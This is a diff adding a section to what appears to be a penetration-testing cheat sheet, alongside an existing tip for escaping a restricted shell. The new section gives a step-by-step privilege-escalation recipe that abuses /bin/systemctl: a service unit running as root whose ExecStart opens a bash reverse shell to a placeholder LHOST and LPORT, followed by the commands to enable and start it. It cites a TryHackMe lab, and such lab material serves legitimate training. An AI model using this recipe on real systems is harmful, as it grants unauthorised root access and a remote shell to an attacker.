@@ -341,3 +341,29 @@ vim file
 When you are in a restricted shell, try the following..  
 press `CTL+V` then press `CTL+J`  
 type `bash` and then press enter.  
+
+### [privesc /bin/systemctl] (To learn more about this privesc you can try the lab in tryhackme https://tryhackme.com/room/vulnversity, this way a great experience)
+```
+1. Create a service unit file within a directory such as /dev/shm
+
+root.service
+
+[Unit]
+Description=xxx
+
+[Service]
+Type=Simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+2. Configure your service unit file using systemctl
+
+/bin/systemctl enable /dev/shm/root.service
+
+3. Executing your payload
+
+/bin/systemctl start root
+```
